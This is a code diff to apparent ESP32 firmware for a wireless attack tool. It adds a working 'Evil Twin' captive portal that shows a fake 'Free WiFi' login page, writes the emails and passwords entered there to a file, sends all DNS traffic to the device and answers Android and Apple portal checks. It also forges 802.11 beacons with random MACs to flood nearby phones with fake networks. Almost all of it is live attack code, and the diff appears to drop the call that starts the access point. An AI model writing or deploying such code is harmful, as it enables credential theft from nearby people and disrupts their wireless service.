@@ -172,9 +172,11 @@ void setup() {
   }
 
   // Evil Twin Web Server Routes
+  // Evil Twin Web Server Routes & Captive Portal Handling
   webServer.on("/", HTTP_ANY, []() {
-      webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit'></form>");
+      webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit' value='Login'></form>");
   });
+
   webServer.on("/login", HTTP_POST, []() {
       String user = webServer.arg("user");
       String pass = webServer.arg("pass");
@@ -184,20 +186,25 @@ void setup() {
       f.println(user + ":" + pass);
       f.close();
       
-      // Virtual Live Feedback
-      Serial.println("CRED_SAVED: " + user);
-      
-      webServer.send(200, "text/html", "<h1>Connecting... please wait.</h1>");
+      webServer.send(200, "text/html", "<h1>Connecting... please wait.</h1><script>setTimeout(function(){window.location.href='http://google.com';}, 3000);</script>");
   });
+
+  // Catch-all for Captive Portal (Android/iOS checks)
   webServer.onNotFound([]() {
       String host = webServer.hostHeader();
+      // If the request is NOT for our IP, redirect to it
       if (host != WiFi.softAPIP().toString()) {
           webServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
           webServer.send(302, "text/plain", "");
       } else {
-          webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit'></form>");
+          // If it IS our IP but unknown path, show login
+          webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit' value='Login'></form>");
       }
   });
+
+  // Specific Android/Apple Captive Portal endpoints
+  webServer.on("/generate_204", [](){ webServer.send(200, "text/html", "<h1>Login</h1><meta http-equiv='refresh' content='0;url=/' />"); });
+  webServer.on("/hotspot-detect.html", [](){ webServer.send(200, "text/html", "<h1>Login</h1><meta http-equiv='refresh' content='0;url=/' />"); });
 }
 
 // ================= LOOP =================
@@ -371,9 +378,13 @@ void startEvilTwin() {
     Serial.println("STARTING EVIL TWIN AP");
     WiFi.disconnect();
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("Generic Free WiFi");
-    dnsServer.start(53, "*", WiFi.softAPIP());
-    webServer.begin();
+    // Start DNS Server (Redirect ALL traffic to us)
+  dnsServer.start(53, "*", WiFi.softAPIP());
+  
+  // Start Web Server
+  webServer.begin();
+  
+  Serial.println("Evil Twin Started. Waiting for victims...");
 }
 
 void stopAttack() {
@@ -531,23 +542,47 @@ const char* rickroll_ssids[] = {
   "8-and hurt you"
 };
 
+// Full 802.11 Beacon Packet Structure
 void sendBeacon(const char* ssid) {
-  uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
-                /*2*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
-                /*8*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
-                /*14*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
-                /*20*/ 0x00, 0x00, /* Sequence */
-                /*22*/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Timestamp */
-                /*30*/ 0x64, 0x00, /* Beacon Interval */
-                /*32*/ 0x01, 0x04, /* Capability Info */
-                /*34*/ 0x00 /* tag info: SSID */ };
-  
-  int ssid_len = strlen(ssid);
-  packet[35] = ssid_len;
-  for(int i=0; i<ssid_len; i++) packet[36+i] = ssid[i];
-  
-  // Supported rates, Channel, etc (Omitted for brevity, but enough to show in scan)
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, 36 + ssid_len, true);
+  // Randomize Source MAC (BSSID) so phones treat them as unique networks
+  uint8_t mac[6];
+  for(int i=0; i<6; i++) mac[i] = random(256);
+  mac[0] = 0x02; // Locally administered bit
+
+  uint8_t packet[128] = { 
+    0x80, 0x00,             // Frame Control (Beacon)
+    0x00, 0x00,             // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (Broadcast)
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source (BSSID) - Randomized!
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID (Same as Source)
+    0x00, 0x00,             // Sequence Control
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+    0x64, 0x00,             // Beacon Interval (100ms)
+    0x01, 0x04              // Capability Info (ESS privacy)
+  };
+
+  int offset = 36;
+
+  // 1. Tag: SSID
+  packet[offset++] = 0;
+  packet[offset++] = strlen(ssid);
+  for(int i=0; i<strlen(ssid); i++) packet[offset++] = ssid[i];
+
+  // 2. Tag: Supported Rates (Mandatory for phones to see it)
+  packet[offset++] = 1;
+  packet[offset++] = 8;
+  packet[offset++] = 0x82; packet[offset++] = 0x84; 
+  packet[offset++] = 0x8b; packet[offset++] = 0x96;
+  packet[offset++] = 0x24; packet[offset++] = 0x30;
+  packet[offset++] = 0x48; packet[offset++] = 0x6c;
+
+  // 3. Tag: DS Parameter Set (Channel 1)
+  packet[offset++] = 3;
+  packet[offset++] = 1;
+  packet[offset++] = 1;
+
+  // Transmit on current interface
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, offset, true);
 }
 
 void performAttackLoop() {
@@ -555,7 +590,7 @@ void performAttackLoop() {
      static int ssid_idx = 0;
      sendBeacon(rickroll_ssids[ssid_idx]);
      ssid_idx = (ssid_idx + 1) % 8;
-     delay(10); 
+     delay(100); // Slower delay to let phones process beacons
   }
   else if (attackType == "sourapple") {
      NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
